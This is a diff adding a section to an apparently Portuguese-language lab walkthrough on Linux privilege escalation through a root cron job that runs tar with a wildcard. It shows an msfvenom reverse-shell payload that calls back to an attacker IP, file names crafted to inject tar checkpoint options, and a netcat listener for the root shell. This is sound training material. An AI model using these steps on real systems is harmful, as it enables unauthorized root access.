@@ -462,3 +462,53 @@ Um shell de superusuário será aberto. Por que isso ocorreu? Pelo fato da vari�
 ### Questões:
 
 - a. ***What is the value of the PATH variable in /etc/crontab?*** */home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin*
+
+## 10 - Cron Jobs - Wildcards 
+
+Quando se visualizou o conteúdo do arquivo ***/etc/crontab***, um outro script estava agendado:
+```shell
+ * * * * * root /usr/local/bin/compress.sh
+```
+Visualizando conteúdo desse script:
+
+```shell
+user@debian:~$ cat /usr/local/bin/compress.sh
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+```
+Esse caractere corginga ou wildcard "*", dentro do diretório home (o qual se tem permissão), permite exploração para elevação de privilégios.
+
+Como está sendo utilizado o comando tar, pode-se consultar o GTFOBins por [tar](https://gtfobins.github.io/gtfobins/tar/).
+
+Observe que o tar possui opções de linha de comando que permitem executar outros comandos como parte de um recurso de ponto de verificação.
+
+Para facilitar a geração de um payload, utiliza-se msfvenom, disponível no Kali, a fim gerar um binário ELF de shell reverso. Atualize o endereço IP LHOST para o IP do hsot atacante:
+
+```shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
+```
+Transfira o arquivo shell.elf para /home/user/ na VM Debian (você pode usar scp ou hospedar o arquivo em um servidor web em sua caixa Kali e usar wget). Adicione permissão de execução ao arquivo:
+
+```shell
+chmod +x /home/user/shell.elf
+```
+
+Para que funcione a exploração do tar, conforme consultado na página do GTFOBins, é necessário criar dois arquivos, conforme abaixo:
+
+```shell
+touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf
+```
+Quando o comando tar na tarefa cron for executado, o curinga (*) será expandido para incluir esses arquivos. Como seus nomes de arquivos são opções de linha de comando tar válidas, o tar irá reconhecê-los como tal e tratá-los como opções de linha de comando em vez de nomes de arquivos.
+
+Configure um listener netcat nos host atacante na porta 4444 e aguarde a execução do cron job (não deve demorar mais de um minuto). Um shell root deve se conectar de volta ao seu ouvinte netcat.
+
+```shell
+nc -nvlp 4444
+```
+
+### Questões:
+
+- a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
+
